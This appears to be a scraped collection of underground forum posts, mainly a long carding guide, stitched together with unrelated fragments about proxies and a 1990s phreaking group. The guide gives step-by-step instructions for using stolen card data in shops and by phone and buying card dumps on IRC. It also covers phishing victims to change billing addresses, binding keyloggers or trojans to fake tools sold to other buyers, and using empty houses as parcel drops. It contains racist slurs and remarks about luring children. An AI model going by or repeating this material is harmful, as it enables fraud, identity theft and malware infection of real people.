at the checkout, just act as normal as you always have been, dont make too much small talk but be polite and civil. Once you have the good sin your hands dont bolt out the door, just say thank you and then casually walk out the door, get to your car and then celebrate all you want. Carding over the phone Okay 1st of all do not be a dumb fuck now, do not call from your own phones at all. For extra lulz you could use a beige box and call from someone elses phone but thats a totally different game all together and is also a major felony to go agains tyou on the chance that you do get caught so well keep it simple and use a payphone (its not AS risky to phreak these but the only recent red box tones I have are from the year 2007 and Im pretty sure theyd have changed the system again...bastards, Ill check sometime though <_<) to call them up. Do not put on a stupid voice at all, the salesman/woman will know and itll be a cause for investigation during the mailing of the goods or the requesting of them. Just be calm, cool and talk to them as you normally would if you were ordering with your own card. Theyll ask for a name, name as it appears on card, phone number, billing address, expiration date, method of shipping, and the product that you want to buy. Also when trying to not seem so shifty be sure to ask questions such as if they can deliver the next day or 1st class, and if they can order it to your \""relatives\"" house so that it can be there for their birthday; maybe even ask if they can write a message to go with the gift as well on your behalf ;). The next day postage is said so that they have less time to look up details on the order. Some cards will have difficulty shipping to any address other than the billing address, but it doesnt hurt to try. If they start to question you then just answer the questions and talk your way around the situation with your social engineering skills; dont just run away from the questions or hang up straight away, otherwise that is cause for suspicion and they may investigate. If all goes well you should have your item of choice delivered to your drop location or a house of someone elses address who you dont know and call them up saying that you called up the store and theyve sent the package to the wrong address and it is still sending there, and ask them if they could kindly keep and sign for the package and youll pick it up after work (this is a last resort and only to be tried if youre good at talking to people, which you should be if youre a carder). I recommend checking out the section on drops later on in this text. I recommend using spoofcard for verification over the payphone, if they need to verify (if they wont send without some verification which is usually the case). IRC Services provided in IRC IRC is the main gathering for fellow carders, scam artists and rippers. To put it in a nut shell, IRC is THE black market, unlike craigslist and eBay which are just black markets. You can get anything illegal off IRC from CP to warez to CC details (which is what we want). To concentrate on carding though you can buy: CVVs CVV2s SSNs Utility bill scans CC scans COB (a service to get someone to call up the victims bank and get the billing address changed to your drop) Payment for using someone elses drop and then sending to you Spyware Fake ID/ ID scans DUMPZ Phisher pages The list really is endless There are a lot of advantages to using IRC networks and channels which Ill go into now: - The channels are often underground and not known to many people, so theyre harder to stumble upon by some random guy. - The messages can be encrypted so they cant be read by anyone happening to be on the network sniffing the traffic. This makes it harder for investigators to uncover. - Easier and quicker to communicate with mass amounts of like minded people. - Variety of channels to go to if one doesnt suit you (there are MILLIONS and new ones being made every second, guaranteed). - And of course a varity of services, if you need something you can bet someone from the other side of the world will be willing to share or/and sell to you. There are a lot of disadvantages though, IRC is the equivalent of a backstreet alley, youll be fine if you stay cautious, heres what you should be weary of: - Viruses - If you dont have strong anti viruses and firewalls you will get infected (no norton shit, kaspersky and NOD32 are what you want) - Do not accept random .exes or any file for that matter - It is easy to get ripped off, choose your forms of payments and who you deal with wisely How to find carding channels (Will not go too much into this as there are secrets between fellow carders which we like people interested enough to find out for themselves) Here is the most commonly asked question I get asked by n00bies and fellow carders; where do you find these channels? If Im being totally honest the best place to find out about them is through Nigerians; no bullshit that is where I found out about a lot of the carder channels I used, also how I found out about forums and their IRCs too such as cardersplanet, darkmarket etc. How I found him out was just on a normal scam bait I was doing, it wasnt a long one, but in the end he tried phishing me so I tried back and we had a laugh about it; I was straight up with him and told him I wanted to get deeper into the game, I looked up to his type of people and wanted to get rich/successful (I also shared the double claim secret about paypal with him which got him trusting me a little bit) he then sent me an invite to cardersplanet (this site was full of Nigerians). Eventually I went in the IRC (admittedly got ripped a few times) then started vending myself under various diff nicknames, then moved onto different sites like darkmarket and cardingzone when Id got invites for them (although cardingzone is shit its good to get in the IRC for starting off, youll get invited to better forums the more you hang out in IRC, trust me). Dont ask me for invites to cardingzone, I was banned for ripping (I didnt rip anyone :angry:) The quicker way is to use these and search for certain keywords: Hidden Content:  You must reply to see links Hidden Content:  You must reply to see links Hidden Content:  You must reply to see links ircarchive.info Hidden Content:  You must reply to see links Hidden Content:  You must reply to see links  ( Hidden Content:  You must reply to see links   Hidden Content:  You must reply to see links ) And of course dont forget google. Im only going to give you one clue for searching through google for a carding IRC, and that word is \""undernet\"". Fellow carders dont like revealing their IRCs, and for obvious reasons. My advice is find a scammer through e-mail, and chat to him; be witty with it but be respectful to a fellow fraudster. Vendors and how to approach them Vendors are the people in IRC who are selling and providing the services for you. There are certain ways you should speak to vendors otherwise theyre going to rip you (remember this is the black market, this is just like going up to a random drug dealer in the street and not knowing what you really want or what youre getting into; youll get ripped off). Ask as many questions as possible of what you want to know, if youre buying a CVV2 ask to see proof of their details working (get them to make a small purchase somewhere; they should show you a before and after and the limits that are there on the card [there are methods out there of checking your balance; you can even get it through text/sms]. This is a market so remember there are more people that will be willing to buy from that vendor, its open for all, you can get a full load of info including dumps for as low as ÃÂ£3/$5, drops usually go for ÃÂ£7; if someone is saying higher prices dont be afraid to haggle down to these prices or a little bit lower. COBs go for a little bit higher in ranges of ÃÂ£15-ÃÂ£20 because the vendor needs to get full info on someone and then change the billing address through the bank to where ever your drop is. Now when you go in the channel dont fucking say or request anything, shut up and see what the vendors are saying they have to offer and then send them a private message and talk to them. If any \""vendor\"" messages you 1st trying to push onto you to buy from them then theyre most likely a ripper; however dont piss off the rippers or assume someone is a ripper because you never know who is going to be there to help you out later on down the line or who might be pissed off enough to fuck you over. I cant give any big advice on not getting ripped in IRC because you dont personally know anyone in there at all, you just have to take your chances (expect to get ripped your 1st few times going in there, just dont go to them again, because if they get away with it once theyll definitely try again if you go back to them). DO NOT BUY ANY WU BUG(Western Union Bug); it is a massive ripper technique which is bullshit. The WU BUG used to work but was patched a looong time ago, most of the time now youll get nothing or youll end up with a rootkit on your comp. Rippers always say ridiculous prices for these too such as $200+; but if someone says lower prices its still bullshit and most likely a rootkit/trojan/keylogger going to be installed on your machine while you get some useless program that does nothing. Ripping Easy as hell to do, not much photoshop skills needed really either. Bullshit and say youre selling full info (youre getting the info from fakenamegenerator.com or any credit card gen program; of course they dont fucking work), if they want to see proof just use your own legit CC or another stolen CC to buy something and show them proof of you buying it, except photoshop the details to that which youre going to be giving him later. Take payment through Western Union ONLY (since e-gold isnt around anymore), then just send him the bullshit info. If they want the report to go to their phone via SMS then just spoof a text with an sms bomber saying some bullshit reports. Then get the payment via WU. To get victims you message them 1st, message out in the whole channel 1st and then PM random buyers (look for ones requesting). ::::WU BUG:::: seriously this is bullshit, all people are doing are showing buyers fake screenshots made in PS or are actually making quick programs themselves and taking screens of them and then selling them, although essentially theyre useless. You want to do this, but you want to actually send them a file as well, but bind a keylogger or trojan to it; not only can you rip them out of their cash to buy your infection but the info you get from spying on them will be so much more as well ranging from their info to other stolen CC info, youll have a backdoor on what they do and can exploit it. If you cant be bothered making fake screenshots then get them from other rippers trying to sell them, get them to show you pics, vids and info; then use it for yourself and rip some n00bs. Phishing for Change of billing A billing address is the details used for a persons bank account and most often their credit cards and everything else too, this includes their phone number too. What a change of billing (COB) is in a nutshell is changing the billing address registered to the card to your drop address youre gonna be using. When you want to card BIG at various online websites the orders will look more legit that youre not sending it else where other than the one registered to the card (obviously after youve changed the billing address), meaning the delivery of your goods will be quicker and will require a lot less verification. Most of the time you change the billing address over the phone but SOME banks will let you do it online; when you phone up to change it you use spoofcard.com or the pay as you go mobile phone youre going to be using when carding, or beige boxing :P When changing the billing address you need to know as much info as possible about the persons billing address youre changing, because the bank is going to ask you 3 security questions you set (such as mothers maiden name) before they change it. You can phish for details over the phone (see the phishin over the phone section above), however its best to use keyloggers and phisher pages for this with a MIX of over the phone. Use through phishing pages 2 methods here, 1 including over the phone, one isnt. The method without the phone is to just send a ton of e-mails out to random people and send them a html e-mail telling them they need to update their information before the account is suspended or their account with the bank will be cancelled, you have them go to a phisher page off the template and the phisher pages \""requires\"" them to answer security questions like their mothers maiden name, their pets name, you know those type of questions. Another method is to call them up pretending to be the bank and saying there have been different ip ranges logging on their account and they need to confirm their details online, link them to the phisher page and have them fill in the details; have the phisher page redirect to the actual online banks login page; then ask if theyve done that over the phone, tell them to wait a minute while you confirm and check it all out, say its all clear and tell them to log in, theyll think nothing of it and you now have the answers to their secret questions which you can give to the bank itself when you go to change the billing address. Use through keylogging This is my favourite method and what I told S_E last night in IRC. You have a hardware (or software) keylogger set on someones comp, use sock proxies when logging into their online bank account and then change their password, call them up pretending to be the bank and then get them to go to the actual online bank link and fill in their forgotten password options (answering secret questions) or of course get them to go to your phisher page and fill in the details (this is if you want to add more fields to get more info) then pretend to be checking it all over, then change their password again to some random letters and numbers and give it to them to log back in (it doesnt matter because theyre keylogged and youll get their new login if they change the password again anyway), youll have all their info logged down too for you to answer your questions when you call the bank. Best time to do all of this is around the 10th day of the month (people usually get their credit reports at the start of every month), this will give you plenty of time to card enough for the remaining days until they see theyre not getting their reports coming to them anymore (if youre crafty you can pretend to have cancelled the online bank account for them after theyve gave you the info you need to know; I used to do this method and keep it going without them knowing). You need as much info as possible when calling up the bank to change the billing address. Drops and what you need to know about them Drops and what you need to know about them What drop locations are and what theyÃ¢â¬â¢re used for Well simply a drop location is an abandoned house, or any house that is not under your name or any of your details. You can lead young children into these to make a sexy time with them, get items delivered to them that you want no one else to find about or risking finding, or just use it to squat in if you have no where else to go. Basically they are used in ways of keeping your nose clean and are used by mostly scam artists and sex offenders. How to find a drop location There are many ways of finding a drop location for use, whether it temporarily or permanently (although I suggest swapping and changing locations because my main last one I used got raided or broken into and is boarded up and too hot to use); I will suggest 3 ways on how you can find some for you to use. One final tip is donÃ¢â¬â¢t bother going for houses that are boarded up at the front where it is visible to passers by (itÃ¢â¬â¢s okay if round the back is boarded up) Way #1 As just mentioned you can go about it many different ways but one of the ways the way I prefer to go about it is you should be looking around some older housing estates and more ghetto areas (could also tie in with the sob story you feed to a paedophile/child predator you are possibly scamming). For example in Derby there is an area called Sinfin, but now there is 2 parts to it and they are New Sinfin and Old Sinfin. Old Sinfin is the are you would want to go to, because itÃ¢â¬â¢s older itÃ¢â¬â¢s most likely to be alot more houses abandoned or deemed unsafe (itÃ¢â¬â¢s bullshit). Or if you were lucky like I once were then you could ask around your mates if there are any empty houses in their area. If there are then youÃ¢â¬â¢re in luck and can even have your friend keep tabs and watching over it for you and give you details so you can keep it all under wraps and safe. It may be alot riskier with neighbour hood watch morons, and nosey neighbours, but itÃ¢â¬â¢s still ideal and a little bit less suspicious than the abandoned houses in the older estates, and this is because the older estates usually have all abandoned houses close by, where as the odd one out covered with a street filled with inhabitants will seem less suspicious to the postman. Way #2 Now this is a temporary way of finding a drop location, but is sometimes an effective ways and means of getting what you need but has a bit more risk to it; and personally is a way I have never used even till today. Have you ever been eavesdropping on a conversation between a neighbour and one of their family memberÃ¢â¬â¢s or friendsÃ¢â¬â¢, or been down the pub and heard the common as muck chavs boasting about a holiday they are going away on for however long they say theyÃ¢â¬â¢re going away for? Well listen out for these type of conversations. Because them away on holiday means the house is most likely going to be empty for however long theyÃ¢â¬â¢re going away for. So if you already know where they live then thatÃ¢â¬â¢s great the job is made easier; if you know their first name and surname then look them up in the phone directory and find their address to go along with the number. If you donÃ¢â¬â¢t know where they live, or their name then just listen out to see if you can hear their names come up in conversation; just remember that if itÃ¢â¬â¢s in the pub itÃ¢â¬â¢s most likely local to it that they live, so you could easily find out by following them home and seeing. Way #3 Possibly the safest, easiest way of finding, and quickest way to get a drop location. Most areas have houses up for sale am I right? Or houses that are up for bidding on, am I right? Well they have a website with a full list of your local area(s) that have houses up for bidding on and for sale. For example I would search Derbyhomefinders and look at the list on their site. All of these houses are empty and often do not have a sign up outside them either (if they do then just take it down and hide it somewhere for the time being). The advantage to using the lists to find the drop locations to use is it will usually say when the bid is up or if the house has been sold (this lets you know that it will not be ideal to use that certain house now itÃ¢â¬â¢s most likely to be inhabited) and will have the houses on there that are still being bidded on and that are still up for sale, these are the ones you want to be using. The best thing about this though is that you have a full list of many different drops to use (like I said earlier itÃ¢â¬â¢s best to switch drop locations and use many different ones) and it is updated with new ones coming up and tells you full which ones are over and not usable. You just need to know your agencies for housing and find their website. Obtaining and using drop locations YouÃ¢â¬â¢re probably thinking now IÃ¢â¬â¢ve got/found one thatÃ¢â¬â¢s great and everything but how the fuck do I keep it a secret? for way 1 this much is obvious that you do not tell anyone except your partner if youÃ¢â¬â¢re doing a team bait, and 1 trustworthy friend to keep tabs on it if you are doing a bait on your own, and also the paedophile, but only when he asks. But there is alot more to it than that, also maintaining your abandoned house and making the postman think someone living there. Appearance isnÃ¢â¬â¢t everything at all in any case and it isnÃ¢â¬â¢t for this either, but of course you try to make yourself look as best as you can. The same principles are applied to keeping an abandoned house; you should atleast try to get a new lock put on the door which you will also have a key for; just so that if any druggies go there before you then they will have a tougher time getting in (of course itÃ¢â¬â¢s ideal you donÃ¢â¬â¢t get somewhere known to druggies but this is an example of what use it could have) but also if there is a fucked up lock on a door then itÃ¢â¬â¢s pretty damn obvious only low life scum or some criminal(s) are using the place, so buy a new lock for the door and get it fitted on, whether you do it yourself or get assistance from a friend who knows what they are doing. Now as for overgrowing plants and weeds, you can only do so much without being suspected. Do not use a lawn mower, use clippers and hack it as short as you can. ItÃ¢â¬â¢s best to get all of this done when everyone is at work during the day time; but in reality it isnÃ¢â¬â¢t ideal at all and most criminals donÃ¢â¬â¢t tend to bother with this. Instead they will make it seem someone is in but is just too ill to do anything with the garden or is just a lazy fucker. They do this by often writing up a note and sticking it to the door or leaving it on the floor near the door saying something such as \""No milk today please\"" or \""Not in, please leave packages at post office\"". Write a few letters to yourself aswell ready to come on the same day as the parcel, this will make it look like you get mail and not just the one off suspicious package now and then. Now 2 alternatives, you can either get to the abandoned house and take the mail from the mailman while acting like you live there (you must look the part as lazy or disabled if you have ingrown plants in \""your\"" garden) or you can leave a note saying to take any packages to the post office for pick up because you are at work or something along those lines. One final rule is do not be in and out of the hideout everyday or whatever, visit probably 2 or 3 times a week. Way 2 Now there are 2 ways to go about this; you can either just get to the house early in the morning a little bit just before the postman arrives and be at the house outside pretending youÃ¢â¬â¢re just about to leave and then sign for the package (if you need to) and collect it off the postman and then be on your way after heÃ¢â¬â¢s gone. Or if youÃ¢â¬â¢re good at bypassing alarms (I have a guide on burglary) or the house has no alarm then you could bump key in at night time (not recommended) or during the day time the day before when everyone else will be at work aswell, and hide out there for a bit (hell even take some food that is left in the fridge and feed yourself since youÃ¢â¬â¢re spending the rest of the day and early morning there). Basic rules are donÃ¢â¬â¢t have tv on too loud if at all, or if you do then put head phones on into the tv if itÃ¢â¬â¢s that old of a model, and leave everything how it was left an say upstairs so incase any neighbours or anyone looking after the house while the owners are away come in then you have time to hide. Obviously if itÃ¢â¬â¢s a package you donÃ¢â¬â¢t have to sign for then you can stick up a note on the door early in the morning before the post man comes saying to leave it round the back or what ever excuse you wanna make up. Way #3 Easy, just as previously except you donÃ¢â¬â¢t have to be as cautious and often the alarms are disabled for that time being anyway so you donÃ¢â¬â¢t have to worry as much if you bump key into it. As also stated previously in this guide, if there are any up for bidding/for sale signs then take them down and just get them out of the way. You can even go to this one the night before instead of day time because no one is hardly going to be watching over this unless itÃ¢â¬â¢s in a neighbourhood watch area (in which case you chose the wrong area anyway, you dumbass). Some basic tips to keep in mind -- Be there before the postman! canÃ¢â¬â¢t stress this enough, itÃ¢â¬â¢s too fucking obvious if youÃ¢â¬â¢re late. -- When signing for packages, if you need to, then sign a fake signature (the sig can be any made up fake shit) with your hand that you donÃ¢â¬â¢t write with, so itÃ¢â¬â¢s harder to trace incase things go tits up later on down the line. -- Take anything in any guide with a pinch of salt, things may be different circumstances for you and your situations; guides are to be used as basisÃ¢â¬â¢s. Also will say the main reason we use SOCK proxies: Sock proxies can receive and send most types of internet traffic such as e-mails, java, flash etc; sock proxies are more private as well and much more secure. Socks traffic is anonymized as it is sent out and the incoming traffic is filtered. You can run most programs through SOCKS easier as well. Bear in mind its wise to disable java, and flash and have your cookies cleared before and during use of the proxies as they can reveal your identity. Disable Javascript, until you need to use it (usually when submitting info). You can find socks(5) proxies online, scanning them to see which ones are still high in anonymity and are working is done through certain scanners you find online. I use accessdiver to check all my proxies from the lists I got. If I ever get a log in for anyproxy again (if I decide to start carding again) then Ill be sure to share some lists sometime. Infact you can actually buy them off the anyproxy.net website, except theyre cheaper in IRC. An extra tip about drops: You can order it to any address you want really, call them up saying they got the address wrong and are sending it there instead (say you live on a street that sounds similar to theirs), ask if they can sign for it and keep it ther euntil you can pick it up after work. This is the best method. +++ UPDATES: I think I should add the updates I posted in another thread in this one as well, its some need to know shit. Nothing in here is outdated, but this is additional needed info. Carding isnt so easy unless you have full details and get them all changed, even then they may bring up a red flag, it depends on the site youre carding. To be easier for example Id card people who live in the same country as me only, just to make the job easier. Why? IIN/BIN is one of the first things they check now. Unless you steal all of their details and call up the bank and tell them youre going \""abroad\"", otherwise all transactions would just be stopped. Get the COB address changed also, obviously this still is absolutely needed to be done to avoid the top red flag. In that case itd be only good for instore carding and if youd phished the pin from them, or if youre buying from IRC get full info. Simple way, keep it to your only country and youll have less work and trouble coming your way. If youre going to card then card big, but not the most expensive thing in stock obviously, dont fuck around with multiple small purchases. Identifying the place the card was issued from can be done through various methods; Hidden Content:  You must reply to see links Hidden Content:  You must reply to see links 2 to name a few. This will help you pick out the phished cards and which ones are of use to you. Now I wasnt really specific about checking for valid CVV2s so Ill tell you that now to stop you wasting your time and to keep this thread alive for further information and input. Now there are loads of sites you can use this trick on to test if a CVV2 is valid so I dont mind giving you one. Hidden Content:  You must reply to see links The way it goes on most sites with this trick is to choose any product at all and go to the checkout, give the real CVV2 info but an incorrect billing address. If it gives an AVS mismatch error and/or cant match the address of the cardholder means its valid. If it tells you the transaction has been declined then your CVV2 is invalid. Dont use yahoo wallet for checking them, it tends to stop a lot of cards working later on. I just thought Id add some more stuff about instore carding because someone I know had an error pop up on one of his cards today because his dumpz on one of the cards had died. This isnt usually a problem because this person used to skim for his own when it was easier, but now he buys them from IRC instead. When you buy dumpz from vendors and are a regular carder there will be times youre carding instore and have errors come up at the point of sale. Now because he chose a dumb nigger cashier this was easier to get out of, so keep in mind to go for nigger cashiers, younger people and dumb women. He got the worst error come up, which was \""call for authorization\"". Now you do not want them to do this at all, so you should make it clear you dont have much time for this, tel them youll call the bank tomorrow and ask them to try another one of your cards. There are many other excuses as well but this was the one the person I know used. You must pu your hand out as if to insist you want the card back whilst talking to them, most of the time they wont know whether to give it you back but will give it you back when put on the spot. If you dont have another card just say you will call the bank about it and come back tomorrow. The key to this however is to remain calm. Then give them another card. Another error is \""declined\"". Youll get this eventually if you have good dumpz on your card, the limit has to end somewhere (get a good IIN to make more money). Before hand you should make out youre not sure how much money is on the card \""I hope I have enough money to cover this\"", or when its declined just stay calm and give them another card and tell them you think the limit must be gone on that one, you had a feeling that was going to happen; laugh it off. If you dont have another card on hand say youll be back soon and youre going to the cash point. Theres many other merchant error codes and I wont cover them all (I linked to them in another thread somewhere when kirby was mod) but once you have practice bullshitting with these errors youll begin getting good at it, its all pretty much the same action you should take anyway. Now youre probably thinking if you have the PIN as well then why not just cash out at the cash point and then pay in cash? You can only draw out ÃÂ£300 within 24 hours most cards. Also if youre carding expensive goods then have some other ID which matches the name on the credit card, theyll ask for this majority of the time if its expensive goods. Sometimes the guy I know has been able to get away with just having a fake business name tag ID whipped up. This wont wash if youre carding rolexes or gemstones. Its best to have another form of fake ID like a driing licence or something like that. =============================================================== COBS Means change of billing. Theres a couple of ways to do it, online or by phone. Alot of banks only need ssn and dob so a lookup for them will sometimes do it. A little advice is do not card 2k 3 hours after you changed the billing. Wait about 3-4 days or maybe a week. Common sense buddy. BIN (bank identification number) keep logs of them, you found one that made you 5k?? save it and get it again. This is one of the most important things in carding and make sure you keep the gold to yourself. Western Union Yes it is possible, but its a pain in the ass. You need to try and try...and keep trying til you discover the treasure. Make sure you get good credit reports. Ill tell you one thing though, USA cc suck ass. I recommend the good ones Germany, Denmark, Sweden, Greece. But some USA bins are still good just look. Hes right about the COB. It takes a while to change now, so get it changed as early into the month as you can, the 8th or 9th is usually good enough for the guy I know. IINs are the most important now indeed if you want to make a good profit and not get busted by limits. UK IINs arent that bad but the best ARE germany, spain and Turkey from what Ive seen so far. Ive got a huge list of IINs which Im a little reluctant to share. As for Western Union Ive heard you need a lot in a lot of countries but in the UK its not too hard at all. Get some sock proxies and make an account online. Add the card details and the receivers details then go through the process. If it all goes well they give you a MTCN (money transaction control number). Call them up to confirm and answer their questions about why youre sending the money and if you know them. I usually give the excuse that Im a job agent and its his weekly pay. They ask other qustions like your D.O.B (this is why you need to be good at phishing or make sure youre buying fullz). Theyll also ask the name of the bank that issued the card, so see the BIN/IIN checkers I linked earlier. Ive heard of some people being asked if its their first time making a transfer through WU from credit card. This is what catches you out or confirms the whole thing; just say yes, its a 50/50 chance. Then go to a WU agent with fake ID of the contact details you gave of the reciever, or if youve got a trustworthy person to pick it up then give his and get him to pick it up. The shit thing is you can only send ÃÂ£100 each transaction and only ÃÂ£600 a month. That was with a UK IIN, Im not sure if itd be different with another card. Western Union is good for cashing out but its not worth all of the stages and there are tons of easier ways. By the way, if youre phishing for fullz you should now ask this question because the banks have upped their security since July. What is the 1st, 3rd and 6th character of your secret password? Phishing over the phone while using spoofcard works handy with banks as well and is pretty fun while youre playing some downloaded office noise MP3 in the background as well. They vary on that question so if you can get the whole password (like you should be aiming to do so) then its easily done. Since Im feeling generous Ill tell you that amazon is EXTREMELY easy to card. A UK only site thats easy to card is additionsdirect, but you need to make an acocunt on the site too; just keep using sock proxies and sign up all in the card holders details and put the billing addresses in there. They allow shipping to alternte addresses still and will leave it around the back in a dry, out of the way place if there is no one there to collect. Easiest place to card so far, they tried making it more difficult by having to sign up to the website. Dont trust VPNs much at all. Main reason being shadowcrew.  That was a sad moment for all fraudsters but a good lesson was learnt for those not in the scene at that time, you never put all of your trust or your eggs in one persons basket. When I was a mod of Bad Ideas, there was some retard flooding the forums everyday because I called him out on trying to scam others off and advertising his shitty fake services in all of his posts; I looked up the IP and turns out the VPN he was using was operated by someone Id done alot of vending with in the past and we helped each other out. This guy was more than willing to give me all traffic details of the guy using his service, I didnt but I certainly threatened to do so to this dumbshit if he didnt stop spamming and fuck off. VPNs are not to be dependable on, there are a few trusted ones out there, but shadowcrew is just proof that anyonecan turn at any time. . """
0	Carding Safetly And Tips:	""" Ever got your hands on some fraud CCs? Never know how to use them safetly, get your clothes online without getting caught? Here are some basic tips to prevent yourself from getting caught and getting packages! Note*: I have put some resources at the end of this guide. If feel free to go straight to them, if you wish to. Rules: 1. You never ever, use card more then 1.5k, mainly because most cards, assuming mastercard/visa, dont have more then 1.5k in them, even if they do, credit card companies are usually called up before the transaction goes through, and the result is, your finished. 2. The second rules in carding, is the make sure you hide yourself well enough to make sure no one ever can find you. My personal recommendation is that you use a proxy (socks is ideal, never use transparent). VPN is not really recommended, read below for more info. 3. It is STRONGLY advised that you read the law in your country regarding cyber crimes, so you know what happens to you, incase you get caught, how to deal with the situation. 4. Use your brain when you card. Its simple, when you card, buy small items, dont buy big. Think about it, which nutcracker would hire a lawyer, run all over the world, chasing you just for a 150 USD package? The cost is of hiring a lawyer for a trial is already much more then his law. Lesson here, buy small, sell big in your country. Convert Virtual cash to REAL cash. 5. Which period of the month is it best to card at? For me, its the middle of every month. Simple, most CC owners, get their financial papers at the 1st of every month. I find a good date is 15-16-17 6. Do not buy anything that has to be delivered to your house. If you do, and the card gets reported, you will get in major trouble. If you do decide to order something, send it to a neighbor, or someone who is out of town. I suggest purchasing overnight so you are not waiting and theres a chance someone comes home or whatever else. 7. The best items to buy online with any CC, is stuff that does not have to be delivered, such as VIP, site access, or other similar material. This works well because you cannot be traced to an address. However, if you continue to use the site, make sure you use a CGI or PHP proxy, which most sites, and forums will allow, just not to make the purchase. 8. Do not use your ISPs e-mail for any orders. Such as:  [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ 9. The key to using fraud CCs, is dont get caught. Dont open your big mouth about carding, if you do, good luck. 10. Do not create any payment gateway accounts with fraud CCs, it will alert the CC owner due to many security processes and verification of the card, you will most likely FAIL to complete it, and the card owner will be notified. 11. If you intend to do money laundering, get yourself some buyers first, buy the items they want with your fraud CC, ask them to pay you via egold. Why egold? Cuz theres no charge back This guide is not foolproof, its just here to guide you along the way on NOT to get caught. I stated earlier not to use VPNs, the main reason for this is being, VPN companies such as Veralinx will COOPERATE with the law, and probably hand over your IP address and info to them. My advice stays, use a socks proxy Some Recommended Procedures you could do to make a purchase with fraud CCs smooth is: 1) Get a proxy near the country of the CC owner itself 2) Offer to verify yourself, by getting a phone spoofing account (Visit Resources below) Some resources for IP Addresses: Check your IP Address to make sure its not yours Proxys - Recommended you use the first few as it normally is pretty fast. Phone Spoofing to Verify Yourself  . """

They compile keyloggers and trojans almost with any such software and when you install them , you are already hacked before even trying to hack others. 4) You are never going to be a good hacker without the knowledge of programming and scripting languages. When you are going to use only ready made softwares and would depend on them for hacking anything then your functionality would be limited upto the functionality of the software. When you are not going to use your brain , just doing the copy paste thing, then how can you even think of being a good hacker. 5) If you are a good Hacker, you already become a good programmer , a good script writer , a good web developer and an excellent security expert.

The only limitation with PHP based proxies is that you require a  web server to host the proxy scripts and second, you also need a domain  name to act as an address for your proxy site. If you donÃ¢â¬â¢t own a  domain or server space, you can still create a personal proxy server for  free and that too without requiring any technical knowledge. [h=2]Create a Free Proxy Server with Google App Engine[/h]HereÃ¢â¬â¢s one such  Hidden Content:  You must reply to see links  that you can build for your friends in China or even for your personal use (say for  Hidden Content:  You must reply to see links  from office). This is created using Google App Engine and, contrary to what you may think, the setup is quite simple. Step 1 : Go to  Hidden Content:  You must reply to see links  and sign-in using your Google Account. Step 2 :  Click the Ã¢â¬ÅCreate an ApplicationÃ¢â¬Â button. Since this is your first  time, Google will send a verification code via SMS to your mobile phone  number. Type the code and youÃ¢â¬â¢re all set to create apps with Google App  Engine. Step 3 : Choose a sub-domain* that will  host your proxy server. Make sure the domain is available, agree to the  Google Terms and click save. The sub-domain is also your App ID that  will uniquely identify your proxy application. For this example, weÃ¢â¬â¢ll use  labnol-proxy-server  as the App ID though you are free to choose any other unique name. Step 4:  OK, now that we have reserved the ID, itÃ¢â¬â¢s time to create and upload the proxy server application to Google App Engine. Go to  Hidden Content:  You must reply to see links , download the 2.6.4 MSI Installer and install Python.

The title  above, and some of the text looks a little screwed up when read in  anything else, so read it in Word Pad. Anyway, for those of you who are wondering \""what do the letters  \""LOA\"" under his handle stand for?\""  Well, LOA stands for Legion Of the  Apocalypse, which is a group of elite hackers and phreakers in my area.   The current members of LOA are: Revelation, Phreaked Out, Hack Attack, Electric Jaguar, and  Phreak Show I started LOA when I discovered that there were many good  hackers and phreakers in my area.  I thought that an organized group of hackers and phreakers would accomplish much more than an individual could by himself.  Thus the Legion Of the Apocalypse was formed and has  been around for a while since.  Our  main goal is to show the public  what hacking and phreaking is all about and to reveal confidential  information to the hacking/phreaking community so that we can learn  more about computers, telephones, electronics, etc. We are hoping to  get our own World Wide Web page soon, so keep an eye out for it.  It  will contain all of the hacking, phreaking, computer, telephone, security, electronics, virus, and carding information that you could  possibly want. Also, if some of you are wondering why I chose the word  Revelation as my handle, well, Revelation means revealing or  unveiling, which is exactly what I intend to do as a hacker/phreaker.  I intend to reveal all the information that I can gather while hacking and phreaking. Anyway, I wrote this document because I have read all the files that I could get my hands on and noticed that there has never been a really good file written that guided beginning hackers and phreakers step by step. When I began hacking and started reading all of the beginner files, I still had many un-answered questions.  My questions were  eventually answered, but only through LOTS of reading and practice.   In this file, I hope to give basic step by step instructions that will  help beginning hackers and phreakers get started.  But, DO NOT think  that this will save you from having to read alot.  If you want to be a  hacker/phreaker, reading is the most important thing you can do.  You  will have to do ALOT of reading no matter what. This document was intended for beginners, but it can also be used as a reference tool for advanced hackers and phreakers. Please distribute this document freely.  Give it to anyone that  you know who is interested in hacking and/or phreaking.  Post it on your  World Wide Web page, Ftp sites, and BBSs.  Do whatever you want with it  as long as it stays UNCHANGED. As far as I know, this is the most complete and in depth beginners guide available, that is why I wrote it.  Also, I plan to have new  volumes come out whenever there has been a significant change in the  material provided, so keep an eye out for them.  LOA is planning on starting an on-line magazine, so look for that too. And we are also starting a hacking business. Owners of businesses can hire us to hack into their systems to find the security faults. The name of this company is A.S.H. (American Security Hackers), and it is run by LOA. If you have any questions about this company, or would like to hire us, or just want security advice, please E-Mail A.S.H. at \"" [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ \"".

